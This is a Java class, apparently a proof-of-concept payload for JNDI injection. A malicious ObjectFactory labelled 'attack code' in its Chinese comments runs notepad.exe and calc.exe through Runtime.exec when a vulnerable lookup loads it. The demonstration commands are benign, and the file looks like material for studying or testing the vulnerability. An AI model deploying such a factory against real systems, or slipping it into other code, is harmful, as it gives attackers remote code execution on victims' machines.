import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

/**
 * @author Zhu Dunfeng
 * @date 2021/12/13 11:33
 */
public class AttackObject implements javax.naming.spi.ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("执行破坏的攻击代码.....");
        //进行破坏攻击
        Runtime.getRuntime().exec("notepad.exe");
        Runtime.getRuntime().exec("calc.exe");
        return null;
    }
}
